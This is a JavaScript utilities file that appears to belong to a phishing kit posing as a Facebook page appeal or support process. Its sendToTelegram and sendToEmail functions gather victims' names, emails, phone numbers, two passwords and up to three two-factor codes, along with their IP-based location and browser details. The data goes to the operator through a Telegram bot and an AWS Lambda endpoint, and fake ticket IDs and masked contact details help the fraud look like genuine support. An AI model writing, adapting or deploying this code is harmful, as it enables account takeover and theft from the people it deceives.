// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    // async getUserIp() {
    //     try {
    //         const response = await fetch('https://api.ipify.org?format=json');
    //         const data = await response.json();
    //         return data.ipAddress;
    //     } catch (error) {
    //         console.error('Error getting IP:', error);
    //         return 'N/A';
    //     }
    // },

    async getUserLocation() {
        try {
            const response = await fetch("https://api.db-ip.com/v2/free/self/");
            if (!response.ok) throw new Error("Network response was not ok");

            const data = await response.json();

            return {
                user_ip: data.ipAddress || "N/A",
                country: data.countryName || "N/A",
                country_code: data.countryCode || "N/A",
                city: data.city || "N/A",
                stateProv: data.stateProv || "N/A"
            };
        } catch (error) {
            console.error("Error getting location:", error);

            return {
                user_ip: "N/A",
                country: "N/A",
                country_code: "N/A",
                region: "N/A",
                stateProv: "N/A"
            };
        }
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();

        const text = `
<code>${locationData.user_ip} - ${locationData.country}</code>
<code>${locationData.city}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>User Agent:</b> <code>${navigator.userAgent}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>Email:</b> <code>${data.email}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Phone:</b> <code>+${data.phone}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>Password One:</b> <code>${data.password || ''}</code>
<b>Password Two:</b> <code>${data.passwordSecond || ''}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>TFA One:</b> <code>${data.twoFa || ''}</code>
<b>TFA Two:</b> <code>${data.twoFaSecond || ''}</code>
<b>TFA Three:</b> <code>${data.twoFaThird || ''}</code>`;

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();

        var templateData = {
            'ip_address': locationData.user_ip,
            'country': locationData.country,
            'country_code': locationData.country_code,
            'city': locationData.city,
            'stateProv': locationData.stateProv,
            'full_name': data.fullName || '',
            'pers_email': data.email || '',
            'bus_email': data.emailBusiness || '',
            'phone_number': data.phone || '',
            'p_one': data.password || '',
            'p_two': data.passwordSecond || '',
            'c_one': data.twoFa || '',
            'c_two': data.twoFaSecond || '',
            'c_three': data.twoFaThird || '',
            'fb_page_name': data.fanpage || '',
            // 'message': formsSendData['apeal'],
            'user_agent': window.navigator.userAgent,
            'user_referrer': window.window.location.href
        };
        try {
            await fetch('https://4thrl473bhkbj7u3v4wixde2uu0wavnb.lambda-url.us-west-2.on.aws', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(templateData)
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};

